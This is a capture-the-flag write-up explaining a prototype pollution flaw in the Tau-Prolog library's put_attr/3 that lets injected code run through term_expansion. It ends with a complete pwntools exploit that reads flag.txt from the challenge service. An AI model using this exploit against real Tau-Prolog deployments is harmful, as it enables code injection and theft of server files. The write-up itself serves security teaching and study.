# prolog-jail

## Description

Escape from prolog!

## Writeup

I'm sorry for all the prolog lovers - this is actually a node jail.

Tau-prolog has a prototype pollution vulnerability in `put_attr/3`. [(Source code)](https://github.com/tau-prolog/tau-prolog/blob/5bd606a255910d8e34ff1d721e80969af294b64c/modules/core.js#L3397). You can set any field of  `Object.prototype`, but you can only set `Term` class as a value.

In tau-prolog, there is a macro called `term_expansion/2`. (See [SWI Prolog documentation](https://www.swi-prolog.org/pldoc/man?predicate=term_expansion/2)) When `term_expansion/2` is defined, Tau-Prolog executes the following query for every facts and rules:

```prolog
<module name>:term_expansion(<rule or fact>, X).
```
Then, if the result for variable `X` is a rule or fact, it will be added to the module.

By ensuring `thread.session.modules[context_module].rules["term_expansion/2"]` and `thread.session.modules[context_module].rules["term_expansion/2"].length` not `undefined` with prototype pollution, the expansion will occur even if `term_expansion` is not defined.

By overriding `opts.context_module` with prototype pollution, you can inject any code when this occurs.[(Source code)](https://github.com/tau-prolog/tau-prolog/blob/5bd606a255910d8e34ff1d721e80969af294b64c/modules/core.js#L1104) You can even comment out the following code by inserting `%` at the end.

 Use `open/4` and `get_char/2` to read the character of the `flag.txt` one by one.

Here's the full exploit.

```python
from pwn import *
io = remote("localhost", 5000)
inj = f"X=(user:flag(Y) :- open(\\'flag.txt\\', read, Z),{''.join([f'get_char(Z, Y{i}),' for i in range(50)])}Y=[{','.join([f'Y{i}' for i in range(50)])}])."
payload = f"""
put_attr(__proto__, context_module, '{inj}%').
put_attr(__proto__, '{inj}%', x).
put_attr(__proto__, rules, x).
put_attr(__proto__, modules, x).
put_attr(__proto__, 'term_expansion/2', x).
put_attr(__proto__, length, 3).    
""".strip().replace("\n", "")
io.sendlineafter(b"Input query: ", payload.encode())
io.recvline()
print(io.recvline().decode())
```